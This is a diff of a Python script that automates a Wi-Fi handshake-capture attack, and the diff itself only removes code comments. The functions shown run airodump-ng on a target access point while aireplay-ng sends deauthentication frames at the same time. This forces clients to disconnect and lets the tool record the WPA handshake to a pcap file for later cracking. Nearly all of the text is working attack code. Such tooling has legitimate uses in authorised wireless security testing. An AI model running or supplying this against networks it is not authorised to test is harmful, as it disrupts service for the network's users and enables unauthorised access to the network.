@@ -53,26 +53,21 @@ def save_ssids_to_file(date, ssid_list):
             ssid_file.write(f"{ssid_info[0]},{ssid_info[1]},{ssid_info[2]}\n")
 
 def capture_handshake(ssid, bssid, channel):
-    # Run airodump-ng to capture frames for a specific BSSID
+    
     pcap_file = f'{tool_directory}/capture_{ssid}.pcap'
 
-    # Start airodump-ng and aireplay-ng in parallel
     with concurrent.futures.ThreadPoolExecutor() as executor:
         future_airdump = executor.submit(airdump_capture, bssid, channel, pcap_file)
         future_deauth = executor.submit(deauth_attack, bssid, channel)
 
-        # Wait for both processes to finish
         concurrent.futures.wait([future_airdump, future_deauth], timeout=120)  # You can adjust the timeout as needed
 
 def airdump_capture(bssid, channel, pcap_file):
     try:
-        # Start airodump-ng in the background
         airodump_process = subprocess.Popen(['airodump-ng', '--bssid', bssid, '--channel', str(channel), '-w', pcap_file, 'wlan0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-        # Wait for the process to run for a maximum of 20 seconds
         time.sleep(20)
 
-        # Terminate the process
         airodump_process.terminate()
     except Exception as e:
         print(f"Error in airodump_capture: {e}")
@@ -80,13 +75,10 @@ def airdump_capture(bssid, channel, pcap_file):
 
 def deauth_attack(bssid, channel):
     try:
-        # Send 20 Deauthentication frames specifying the channel
         deauth_process = subprocess.Popen(['aireplay-ng', '--deauth', '20', '-a', bssid, 'wlan0'])
 
-        # Wait for the process to run for a maximum of 20 seconds
         time.sleep(20)
 
-        # Terminate the process
         deauth_process.terminate()
     except Exception as e:
         print(f"Error in deauth_attack: {e}")
